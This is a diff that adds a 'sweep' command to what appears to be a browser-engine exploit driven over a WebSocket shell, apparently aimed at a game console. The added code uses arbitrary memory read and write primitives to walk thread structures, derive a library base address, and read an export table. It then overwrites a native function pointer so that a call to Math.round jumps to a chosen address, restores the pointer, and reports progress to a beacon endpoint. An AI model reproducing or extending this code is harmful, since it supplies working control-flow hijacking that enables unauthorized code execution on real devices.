@@ -5433,6 +5433,70 @@ function _startWsShell(){
         break;
       }
 
+      case 'sweep':{
+        /* THE STUB-LADDER SWEEP: derive lk_base, read export table entry
+         * #msg.idx, compute target = lk_base + text_rva, rawcall it with
+         * a zeroed scope. One-arg stubs (thr_self etc) write the TID to
+         * scope[0] and survive. Multi-arg writers cost a session death.
+         * The reply carries {idx, text_rva, scope[0..3], verified}. */
+        if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
+        function SW(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('SWP-'+s),false);x.send();}catch(e){}}
+        try{
+          var ent=S.absRead(0x10001c8000n,0x100);
+          var trPtr=0n;
+          for(var ei=0;ei<ent.length;ei++){if(ent[ei]>=0x10001f0000n&&ent[ei]<0x1000200000n){trPtr=ent[ei];break;}}
+          SW('1 tr=0x'+trPtr.toString(16));
+          if(trPtr===0n){reply.err='no thread-record ptr';break;}
+          var tr=S.absRead(trPtr,0x60);
+          var ptp=0n;
+          for(var ti2=0;ti2<tr.length;ti2++){if(tr[ti2]>=0x880000000n&&tr[ti2]<0x900000000n){ptp=tr[ti2];break;}}
+          SW('2 pt=0x'+ptp.toString(16));
+          if(ptp===0n){reply.err='no pthread ptr';break;}
+          var node=ptp,Q=0n;
+          for(var hop=0;hop<5;hop++){
+            var p=S.absRead(node,0x60);
+            Q=p[8];
+            SW('3 hop'+hop+' Q=0x'+Q.toString(16));
+            if((Q&0x3fffn)===0x218n&&Q>0x800000000n)break;
+            node=Q-0x38n;
+          }
+          if((Q&0x3fffn)!==0x218n){reply.err='backlink fail';break;}
+          var B=Q-0x6C218n;
+          if(B%0x4000n!==0n){reply.err='base unaligned';break;}
+          SW('4 B=0x'+B.toString(16));
+          var can=S.absRead(B+0x751D0n,8)[0];
+          SW('5 canary=0x'+can.toString(16));
+          if(!(can>0x1000000n)){reply.err='canary fail';break;}
+          reply.base='0x'+B.toString(16);
+          /* Read export table entry #msg.idx */
+          var tbl=B+0x48000n;
+          var idx=parseInt(msg.idx)||0;
+          var eoff=0xC+idx*8;
+          var e1=S.absRead(tbl+BigInt(eoff),8)[0];
+          var sR=Number(e1&0xFFFFFFFFn);
+          var txt=0x48000+Number(BigInt.asIntN(32,BigInt(sR)));
+          var target=B+BigInt(txt);
+          SW('6 idx='+idx+' text=0x'+txt.toString(16)+' target=0x'+target.toString(16));
+          reply.idx=idx;
+          reply.text='0x'+txt.toString(16);
+          /* RAWCALL: zero scope, redirect, call, restore, read scope */
+          for(var zr=0;zr<4;zr++)S.absWrite(S.fakeScope+BigInt(zr*8),0n);
+          if(S.scopeSlot&&S.fakeScope&&S.scopeOrig)S.absWrite(S.scopeSlot,S.fakeScope);
+          var origFnR=S.absRead(S.neEntry.addr+0x28n,8)[0];
+          S.absWrite(S.neEntry.addr+0x28n,target);
+          SW('7 CALLING');
+          try{Math.round(-5.7);}catch(e){}
+          S.absWrite(S.neEntry.addr+0x28n,origFnR);
+          if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
+          var vfyR=(S.absRead(S.neEntry.addr+0x28n,8)[0]===origFnR);
+          var sc0=S.absRead(S.fakeScope,8)[0],sc1=S.absRead(S.fakeScope+8n,8)[0],sc2=S.absRead(S.fakeScope+16n,8)[0],sc3=S.absRead(S.fakeScope+24n,8)[0];
+          SW('8 SURVIVED scope0=0x'+sc0.toString(16));
+          reply.verified=vfyR;
+          reply.scope=['0x'+sc0.toString(16),'0x'+sc1.toString(16),'0x'+sc2.toString(16),'0x'+sc3.toString(16)];
+        }catch(e2){reply.err='sweep fault: '+String(e2&&e2.message?e2.message:'?');}
+        break;
+      }
+
       case 'e2witness':{
         /* v16 - THE ROBUST CHAIN + THE NID TABLE READER. The NID
          * computation is CRACKED (ps5rs algorithm.rs: SHA1(name + salt
